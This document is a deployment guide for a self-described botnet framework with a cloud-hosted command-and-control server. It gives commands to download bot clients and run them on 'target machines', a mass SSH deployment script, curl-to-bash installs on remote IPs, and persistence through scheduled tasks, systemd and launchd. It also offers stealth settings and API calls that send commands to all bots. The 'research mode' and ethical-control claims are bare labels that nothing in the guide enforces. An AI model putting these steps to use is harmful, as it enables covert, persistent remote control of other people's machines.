# Bot Client Deployment Guide
## Advanced Botnet Research Framework

Deploy standalone bot clients that connect to your Render C2 server.

## 🎯 Quick Deployment Options

### **Option 1: Pre-built Binaries (Recommended)**
Download ready-to-use executables for different platforms:

**Windows:**
```powershell
# Download Windows client
curl -L https://botnet-wqg2.onrender.com/download/client-windows.exe -o bot-client.exe

# Run client
./bot-client.exe --server https://botnet-wqg2.onrender.com --research-mode
```

**Linux:**
```bash
# Download Linux client
wget https://botnet-wqg2.onrender.com/download/client-linux -O bot-client

# Make executable and run
chmod +x bot-client
./bot-client --server https://botnet-wqg2.onrender.com --research-mode
```

**macOS:**
```bash
# Download macOS client
curl -L https://botnet-wqg2.onrender.com/download/client-macos -o bot-client

# Make executable and run
chmod +x bot-client
./bot-client --server https://botnet-wqg2.onrender.com --research-mode
```

### **Option 2: Docker-based Client Generation**
Use Docker to compile clients for all platforms:

```bash
# Build all client binaries
docker run --rm -v $(pwd):/workspace botnet-builder:latest

# This generates:
# - client-windows.exe
# - client-linux
# - client-macos
```

### **Option 3: Cloud-based Client Builder**
Use the web interface to generate custom clients:

1. **Go to**: https://botnet-wqg2.onrender.com/builder
2. **Configure**: Research mode, server URL, encryption keys
3. **Generate**: Download platform-specific executables
4. **Deploy**: Copy to target machines

## 🔧 Client Configuration

### **Command Line Options:**
```bash
./bot-client [OPTIONS]

Options:
  --server URL           C2 server URL (default: auto-detect)
  --research-mode        Enable research mode (required)
  --session-id ID        Research session identifier
  --stealth-level LEVEL  Stealth level (0=none, 5=maximum)
  --reconnect-delay SEC  Reconnect delay in seconds
  --config FILE          Load configuration from file
  --help                 Show this help message
```

### **Configuration File:**
```json
{
  "server": {
    "primary_url": "https://botnet-wqg2.onrender.com",
    "fallback_urls": [
      "https://backup-server.onrender.com"
    ],
    "encryption_key": "your-encryption-key",
    "verify_ssl": true
  },
  "research": {
    "mode": "strict",
    "session_id": "research_2024_001",
    "ethical_controls": true,
    "auto_report": true
  },
  "client": {
    "stealth_level": 2,
    "reconnect_interval": 30,
    "max_command_size": 1048576,
    "log_level": "INFO"
  }
}
```

## 🚀 Deployment Methods

### **1. Manual Deployment**
Copy and run clients manually on target systems:

```bash
# Copy client to target machine
scp bot-client user@target-machine:/tmp/

# SSH to target and run
ssh user@target-machine
cd /tmp
./bot-client --server https://botnet-wqg2.onrender.com --research-mode
```

### **2. Mass Deployment Script**
Deploy to multiple machines automatically:

```bash
#!/bin/bash
# deploy-clients.sh

SERVERS=(
  "192.168.1.100"
  "192.168.1.101" 
  "192.168.1.102"
)

C2_SERVER="https://botnet-wqg2.onrender.com"

for server in "${SERVERS[@]}"; do
  echo "Deploying to $server..."
  
  # Copy client
  scp bot-client user@$server:/tmp/
  
  # Run in background
  ssh user@$server "cd /tmp && nohup ./bot-client --server $C2_SERVER --research-mode > /dev/null 2>&1 &"
  
  echo "Deployed to $server"
done
```

### **3. Cloud Instance Deployment**
Deploy clients on cloud instances (AWS, DigitalOcean, etc.):

```bash
# AWS EC2 deployment
aws ec2 run-instances \
  --image-id ami-12345678 \
  --count 5 \
  --instance-type t2.micro \
  --user-data file://client-userdata.sh

# DigitalOcean deployment
doctl compute droplet create bot-client-1 \
  --image ubuntu-20-04-x64 \
  --size s-1vcpu-1gb \
  --user-data-file client-userdata.sh
```

## 🔒 Security & Research Compliance

### **Built-in Safety Features:**
- ✅ **Research Mode Only**: Clients refuse to run without research mode
- ✅ **Ethical Controls**: Automatic boundary enforcement
- ✅ **Activity Logging**: Comprehensive operation logging
- ✅ **Geographic Restrictions**: Configurable regional limits
- ✅ **Time Constraints**: Automatic session expiration
- ✅ **Emergency Stop**: Remote termination capability

### **Legal Compliance:**
- ✅ **Educational Use Only**: Clear usage restrictions
- ✅ **Authorized Testing**: Deployment only on owned/authorized systems
- ✅ **Research Documentation**: Activity reporting for academic use
- ✅ **Data Protection**: No sensitive data collection

## 📊 Monitoring & Management

### **Real-time Monitoring:**
- **Dashboard**: https://botnet-wqg2.onrender.com
- **API Status**: https://botnet-wqg2.onrender.com/api/status
- **Health Check**: https://botnet-wqg2.onrender.com/health

### **Client Management:**
```bash
# Check client status
curl -s https://botnet-wqg2.onrender.com/api/bots | jq

# Send commands to all clients
curl -X POST https://botnet-wqg2.onrender.com/api/commands \
  -H "Content-Type: application/json" \
  -d '{"command": "system_info", "targets": ["all"]}'

# Emergency stop all clients
curl -X POST https://botnet-wqg2.onrender.com/api/emergency-stop
```

## 🌐 Platform-Specific Deployment

### **Windows Deployment:**
```powershell
# PowerShell deployment script
$client = "https://botnet-wqg2.onrender.com/download/client-windows.exe"
$server = "https://botnet-wqg2.onrender.com"

# Download client
Invoke-WebRequest -Uri $client -OutFile "bot-client.exe"

# Create scheduled task for persistence (research only)
$action = New-ScheduledTaskAction -Execute "bot-client.exe" -Argument "--server $server --research-mode"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "ResearchClient" -Action $action -Trigger $trigger
```

### **Linux Deployment:**
```bash
#!/bin/bash
# Linux deployment with systemd service

# Download and install client
wget https://botnet-wqg2.onrender.com/download/client-linux -O /usr/local/bin/bot-client
chmod +x /usr/local/bin/bot-client

# Create systemd service
cat > /etc/systemd/system/research-client.service << EOF
[Unit]
Description=Research Bot Client
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/bot-client --server https://botnet-wqg2.onrender.com --research-mode
Restart=always
User=research

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl enable research-client
systemctl start research-client
```

### **macOS Deployment:**
```bash
#!/bin/bash
# macOS deployment with launchd

# Download client
curl -L https://botnet-wqg2.onrender.com/download/client-macos -o /usr/local/bin/bot-client
chmod +x /usr/local/bin/bot-client

# Create launch daemon
cat > ~/Library/LaunchAgents/com.research.botclient.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.research.botclient</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/bot-client</string>
        <string>--server</string>
        <string>https://botnet-wqg2.onrender.com</string>
        <string>--research-mode</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

# Load launch daemon
launchctl load ~/Library/LaunchAgents/com.research.botclient.plist
```

## 🎯 Quick Start Commands

**Deploy 1 client (current machine):**
```bash
curl -s https://botnet-wqg2.onrender.com/download/client-$(uname -s | tr '[:upper:]' '[:lower:]') | bash
```

**Deploy to multiple IPs:**
```bash
echo "192.168.1.100 192.168.1.101 192.168.1.102" | xargs -n1 -I{} ssh user@{} "curl -s https://botnet-wqg2.onrender.com/install | bash"
```

**Generate custom client:**
```bash
curl -X POST https://botnet-wqg2.onrender.com/api/generate-client \
  -H "Content-Type: application/json" \
  -d '{"platform": "linux", "config": {"research_mode": true}}' \
  -o custom-client
```

## 🆘 Troubleshooting

**Client won't connect:**
- Check server URL: https://botnet-wqg2.onrender.com/health
- Verify research mode is enabled
- Check firewall settings

**Permission denied:**
- Ensure executable permissions: `chmod +x bot-client`
- Run as appropriate user (avoid root unless necessary)

**Can't download client:**
- Server may be starting up (wait 2-3 minutes)
- Check internet connectivity
- Try alternative download methods

## 🎉 You're Ready!

Your C2 server is running at **https://botnet-wqg2.onrender.com** and ready to accept client connections!

Choose your deployment method and start connecting clients to your cloud-hosted research framework! 🚀
